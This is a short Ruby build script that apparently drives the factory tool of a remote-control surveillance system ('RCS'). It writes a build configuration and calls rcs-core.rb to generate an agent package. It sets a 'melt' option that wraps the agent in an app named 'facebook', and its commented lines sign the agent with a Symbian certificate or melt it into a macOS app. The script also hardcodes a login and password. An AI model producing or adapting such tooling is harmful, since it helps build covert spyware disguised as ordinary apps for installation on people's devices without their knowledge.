#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000757'
PLATFORM = 'upgrade'
DB = '127.0.0.1'
DEMO = false

ver = DEMO ? '_demo' : ''

###################################################################################################
params = {platform: PLATFORM,
          generate: {platforms: [],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P 4444 -f #{FACTORY} -b build.json -o #{PLATFORM}#{ver}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
###################################################################################################
